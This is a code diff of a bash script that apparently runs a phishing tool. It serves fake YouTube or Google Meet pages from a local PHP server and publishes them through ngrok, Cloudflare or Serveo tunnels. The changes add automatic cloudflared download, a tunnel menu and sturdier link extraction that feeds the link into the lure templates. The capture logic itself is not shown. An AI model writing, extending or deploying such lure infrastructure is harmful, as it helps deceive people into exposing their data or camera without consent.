@@ -38,6 +38,8 @@ stop() {
 checkngrok=$(ps aux | grep -o "ngrok" | head -n1)
 checkphp=$(ps aux | grep -o "php" | head -n1)
 checkssh=$(ps aux | grep -o "ssh" | head -n1)
+checkcloudflared=$(ps aux | grep -o "cloudflared" | head -n1)
+
 if [[ $checkngrok == *'ngrok'* ]]; then
 pkill -f -2 ngrok > /dev/null 2>&1
 killall -2 ngrok > /dev/null 2>&1
@@ -46,9 +48,16 @@ fi
 if [[ $checkphp == *'php'* ]]; then
 killall -2 php > /dev/null 2>&1
 fi
+
 if [[ $checkssh == *'ssh'* ]]; then
 killall -2 ssh > /dev/null 2>&1
 fi
+
+if [[ $checkcloudflared == *'cloudflared'* ]]; then
+pkill -f -2 cloudflared > /dev/null 2>&1
+killall -2 cloudflared > /dev/null 2>&1
+fi
+
 exit 1
 
 }
@@ -108,8 +117,22 @@ printf "\e[1;77m[\e[0m\e[1;33m+\e[0m\e[1;77m] Starting php server... (localhost:
 fuser -k 3333/tcp > /dev/null 2>&1
 php -S localhost:3333 > /dev/null 2>&1 &
 sleep 3
-# Wait a bit more for the link to be written completely
-sleep 2
+
+# Wait for sendlink file to have content (with timeout)
+printf "\e[1;77m[\e[0m\e[1;93m+\e[0m\e[1;77m] Waiting for Serveo link...\e[0m\n"
+max_wait=30
+wait_count=0
+while [ $wait_count -lt $max_wait ]; do
+    if [[ -s "sendlink" ]]; then
+        # Check if file contains a URL
+        if grep -qE "https://" sendlink 2>/dev/null; then
+            break
+        fi
+    fi
+    sleep 1
+    wait_count=$((wait_count + 1))
+done
+
 # Strip ANSI codes first, then extract URL - this handles the escape sequences
 send_link=$(cat sendlink 2>/dev/null | sed 's/\x1b\[[0-9;]*m//g' | grep -oE "https://[^[:space:]]+" | head -n1)
 # If that fails, try with a more specific pattern
@@ -128,6 +151,8 @@ if [[ -n "$send_link" ]]; then
     printf '\n\e[1;93m[\e[0m\e[1;77m+\e[0m\e[1;93m] Direct link:\e[0m\e[1;77m %s\e[0m\n\n' "$send_link"
 else
     printf '\n\e[1;31m[!] Could not extract link from sendlink file\e[0m\n'
+    printf '\e[1;77m[DEBUG] sendlink file exists: %s\e[0m\n' "$([ -e sendlink ] && echo 'yes' || echo 'no')"
+    printf '\e[1;77m[DEBUG] sendlink file size: %s bytes\e[0m\n' "$([ -e sendlink ] && wc -c < sendlink || echo '0')"
     printf '\e[1;77m[DEBUG] sendlink contents:\e[0m\n'
     cat sendlink 2>/dev/null || echo "Cannot read sendlink file"
     printf '\e[1;77m[DEBUG] Cleaned contents (without ANSI codes):\e[0m\n'
@@ -141,6 +166,110 @@ fi
 payload_ngrok() {
 
 link=$(curl -s -N http://127.0.0.1:4040/api/tunnels | grep -o 'https://[^/"]*\.ngrok-free.app')
+if [[ -z "$link" ]]; then
+    printf "\e[1;31m[!] Error: Could not extract Ngrok link\e[0m\n"
+    return 1
+fi
+generate_payload "$link"
+
+}
+
+cloudflared_server() {
+
+command -v cloudflared > /dev/null 2>&1
+if [[ $? -ne 0 ]]; then
+    printf "\e[1;92m[\e[0m+\e[1;92m] Cloudflared not found. Downloading...\n"
+    arch=$(uname -m)
+    os=$(uname -s | tr '[:upper:]' '[:lower:]')
+    
+    if [[ "$os" == "linux" ]]; then
+        if [[ "$arch" == *"arm"* ]] || [[ "$arch" == *"aarch64"* ]]; then
+            wget -q https://github.com/cloudflare/cloudflared/releases/latest/download/cloudflared-linux-arm64 -O cloudflared 2>/dev/null || \
+            wget -q https://github.com/cloudflare/cloudflared/releases/latest/download/cloudflared-linux-arm -O cloudflared 2>/dev/null
+        elif [[ "$arch" == *"x86_64"* ]] || [[ "$arch" == *"amd64"* ]]; then
+            wget -q https://github.com/cloudflare/cloudflared/releases/latest/download/cloudflared-linux-amd64 -O cloudflared 2>/dev/null
+        else
+            wget -q https://github.com/cloudflare/cloudflared/releases/latest/download/cloudflared-linux-386 -O cloudflared 2>/dev/null
+        fi
+    elif [[ "$os" == "darwin" ]]; then
+        if [[ "$arch" == *"arm"* ]] || [[ "$arch" == *"aarch64"* ]]; then
+            wget -q https://github.com/cloudflare/cloudflared/releases/latest/download/cloudflared-darwin-arm64 -O cloudflared 2>/dev/null
+        else
+            wget -q https://github.com/cloudflare/cloudflared/releases/latest/download/cloudflared-darwin-amd64 -O cloudflared 2>/dev/null
+        fi
+    else
+        printf "\e[1;93m[!] Unsupported OS. Please install cloudflared manually.\e[0m\n"
+        printf "\e[1;93m[!] Visit: https://github.com/cloudflare/cloudflared/releases\e[0m\n"
+        exit 1
+    fi
+    
+    if [[ -e cloudflared ]]; then
+        chmod +x cloudflared
+        printf "\e[1;92m[\e[0m*\e[1;92m] Cloudflared downloaded successfully\e[0m\n"
+    else
+        printf "\e[1;93m[!] Download failed. Please install cloudflared manually.\e[0m\n"
+        exit 1
+    fi
+fi
+
+if [[ $checkphp == *'php'* ]]; then
+killall -2 php > /dev/null 2>&1
+fi
+
+printf "\e[1;77m[\e[0m\e[1;93m+\e[0m\e[1;77m] Starting php server... (localhost:3333)\e[0m\n"
+fuser -k 3333/tcp > /dev/null 2>&1
+php -S localhost:3333 > /dev/null 2>&1 &
+sleep 2
+
+printf "\e[1;77m[\e[0m\e[1;93m+\e[0m\e[1;77m] Starting Cloudflare tunnel...\e[0m\n"
+if [[ -e cloudflared ]]; then
+    ./cloudflared tunnel --url http://localhost:3333 > sendlink 2>&1 &
+else
+    cloudflared tunnel --url http://localhost:3333 > sendlink 2>&1 &
+fi
+
+sleep 8
+
+# Wait for sendlink file to have content (with timeout)
+printf "\e[1;77m[\e[0m\e[1;93m+\e[0m\e[1;77m] Waiting for Cloudflare tunnel link...\e[0m\n"
+max_wait=30
+wait_count=0
+while [ $wait_count -lt $max_wait ]; do
+    if [[ -s "sendlink" ]]; then
+        # Check if file contains a URL
+        if grep -qE "https://.*trycloudflare.com" sendlink 2>/dev/null; then
+            break
+        fi
+    fi
+    sleep 1
+    wait_count=$((wait_count + 1))
+done
+
+# Extract Cloudflare tunnel URL
+send_link=$(cat sendlink 2>/dev/null | grep -oE "https://[a-zA-Z0-9\-]+\.trycloudflare\.com" | head -n1)
+
+if [[ -n "$send_link" ]]; then
+    printf '\n\e[1;93m[\e[0m\e[1;77m+\e[0m\e[1;93m] Direct link:\e[0m\e[1;77m %s\e[0m\n\n' "$send_link"
+    # Generate payload with the extracted link
+    generate_payload "$send_link"
+else
+    printf '\n\e[1;31m[!] Could not extract Cloudflare tunnel link\e[0m\n'
+    printf '\e[1;77m[DEBUG] sendlink file exists: %s\e[0m\n' "$([ -e sendlink ] && echo 'yes' || echo 'no')"
+    printf '\e[1;77m[DEBUG] sendlink contents:\e[0m\n'
+    cat sendlink 2>/dev/null | head -20 || echo "Cannot read sendlink file"
+    printf '\n'
+    return 1
+fi
+
+}
+
+generate_payload() {
+local link="$1"
+if [[ -z "$link" ]]; then
+    printf '\e[1;31m[!] Error: No link provided for payload generation\e[0m\n'
+    return 1
+fi
+
 sed 's+forwarding_link+'$link'+g' template.php > index.php
 if [[ $option_tem -eq 1 ]]; then
 sed 's+forwarding_link+'$link'+g' Youtube.html > index3.html
@@ -149,7 +278,6 @@ rm -rf index3.html
 elif [[ $option_tem -eq 2 ]]; then
 sed 's+forwarding_link+'$link'+g' Gmeet.html > index2.html
 fi
-
 }
 
 select_template() {
@@ -167,6 +295,27 @@ else
 printf "\e[1;93m [!] Invalid template option! try again\e[0m\n"
 sleep 1
 select_template
+fi
+}
+
+select_tunnel() {
+printf "\n-----Choose a tunnel service----\n"
+printf "\n\e[1;92m[\e[0m\e[1;77m01\e[0m\e[1;92m]\e[0m\e[1;93m Ngrok\e[0m\n"
+printf "\e[1;92m[\e[0m\e[1;77m02\e[0m\e[1;92m]\e[0m\e[1;93m Cloudflare Tunnel (cloudflared)\e[0m\n"
+printf "\e[1;92m[\e[0m\e[1;77m03\e[0m\e[1;92m]\e[0m\e[1;93m Serveo.net\e[0m\n"
+default_option_tunnel="3"
+read -p $'\n\e[1;92m[\e[0m\e[1;77m+\e[0m\e[1;92m] Choose a tunnel service: [Default is 3] \e[0m' option_tunnel
+option_tunnel="${option_tunnel:-${default_option_tunnel}}"
+if [[ $option_tunnel -eq 1 ]]; then
+printf "\e[1;93m[\e[0m*\e[1;93m] Selected: Ngrok\e[0m\n"
+elif [[ $option_tunnel -eq 2 ]]; then
+printf "\e[1;93m[\e[0m*\e[1;93m] Selected: Cloudflare Tunnel\e[0m\n"
+elif [[ $option_tunnel -eq 3 ]]; then
+printf "\e[1;93m[\e[0m*\e[1;93m] Selected: Serveo.net\e[0m\n"
+else
+printf "\e[1;93m [!] Invalid tunnel option! try again\e[0m\n"
+sleep 1
+select_tunnel
 fi
 }
 
@@ -218,8 +367,15 @@ else
 read -p $'\e[1;92m[\e[0m\e[1;77m+\e[0m\e[1;92m] Enter your valid ngrok authtoken: \e[0m' ngrok_auth
 ./ngrok authtoken $ngrok_auth >  /dev/null 2>&1 &
 fi
+
+checkphp=$(ps aux | grep -o "php" | head -n1)
+if [[ $checkphp == *'php'* ]]; then
+killall -2 php > /dev/null 2>&1
+fi
+
 printf "\e[1;92m[\e[0m+\e[1;92m] Starting php server...\n"
-php -S 127.0.0.1:3333 > /dev/null 2>&1 & 
+fuser -k 3333/tcp > /dev/null 2>&1
+php -S 127.0.0.1:3333 > /dev/null 2>&1 &
 sleep 2
 printf "\e[1;92m[\e[0m+\e[1;92m] Starting ngrok server...\n"
 ./ngrok http 3333 > /dev/null 2>&1 &
@@ -246,9 +402,15 @@ rm -rf sendlink
 fi
 
 command -v php > /dev/null 2>&1 || { echo >&2 "I require php but it's not installed. Install it. Aborting."; exit 1; }
-command -v ssh > /dev/null 2>&1 || { echo >&2 "I require ssh but it's not installed. Install it. Aborting."; exit 1; }
 
 select_template
+select_tunnel
+
+# Check SSH requirement only for Serveo
+if [[ $option_tunnel -eq 3 ]]; then
+    command -v ssh > /dev/null 2>&1 || { echo >&2 "I require ssh but it's not installed. Install it. Aborting."; exit 1; }
+fi
+
 start
 
 }
@@ -257,34 +419,53 @@ start
 payload() {
 
 # Strip ANSI codes and extract URL - try multiple methods
-send_link=$(cat sendlink | sed 's/\x1b\[[0-9;]*m//g' | grep -oE "https://[^[:space:]]*" | head -n1)
+send_link=$(cat sendlink 2>/dev/null | sed 's/\x1b\[[0-9;]*m//g' | grep -oE "https://[^[:space:]]*" | head -n1)
 if [[ -z "$send_link" ]]; then
     # Alternative: extract any https URL pattern
-    send_link=$(cat sendlink | tr -d '\r' | grep -oE "https://[a-zA-Z0-9\-\.]+\.(serveo\.net|serveousercontent\.com)" | head -n1)
+    send_link=$(cat sendlink 2>/dev/null | tr -d '\r' | sed 's/\x1b\[[0-9;]*m//g' | grep -oE "https://[a-zA-Z0-9\-\.]+\.(serveo\.net|serveousercontent\.com)" | head -n1)
 fi
 if [[ -z "$send_link" ]]; then
     # Last resort: extract anything that looks like a URL
-    send_link=$(cat sendlink | sed 's/.*https:\/\///' | sed 's/[[:space:]].*//' | head -n1)
-    if [[ -n "$send_link" ]]; then
+    send_link=$(cat sendlink 2>/dev/null | sed 's/.*https:\/\///' | sed 's/[[:space:]].*//' | head -n1)
+    if [[ -n "$send_link" && "$send_link" != *"https://"* ]]; then
         send_link="https://$send_link"
     fi
 fi
-sed 's+forwarding_link+'$send_link'+g' template.php > index.php
-if [[ $option_tem -eq 1 ]]; then
-sed 's+forwarding_link+'$send_link'+g' Youtube.html > index3.html
-sed 's+live_yt_tv+'$yt_video_ID'+g' index3.html > index2.html
-rm -rf index3.html
-elif [[ $option_tem -eq 2 ]]; then
-sed 's+forwarding_link+'$send_link'+g' Gmeet.html > index2.html
+
+# Check if we successfully extracted a link
+if [[ -z "$send_link" ]]; then
+    printf '\e[1;31m[!] Error: Could not extract link for payload generation\e[0m\n'
+    printf '\e[1;93m[!] Please check the sendlink file or try again\e[0m\n'
+    return 1
 fi
+
+generate_payload "$send_link"
 
 }
 
 start() {
 
-server
-payload
-checkfound
+if [[ $option_tunnel -eq 1 ]]; then
+    # Ngrok
+    ngrok_server
+elif [[ $option_tunnel -eq 2 ]]; then
+    # Cloudflare Tunnel
+    cloudflared_server
+    if [[ $? -eq 0 ]]; then
+        checkfound
+    else
+        printf "\e[1;31m[!] Failed to start Cloudflare tunnel\e[0m\n"
+        exit 1
+    fi
+elif [[ $option_tunnel -eq 3 ]]; then
+    # Serveo
+    server
+    payload
+    checkfound
+else
+    printf "\e[1;31m[!] Invalid tunnel option\e[0m\n"
+    exit 1
+fi
 
 }
 
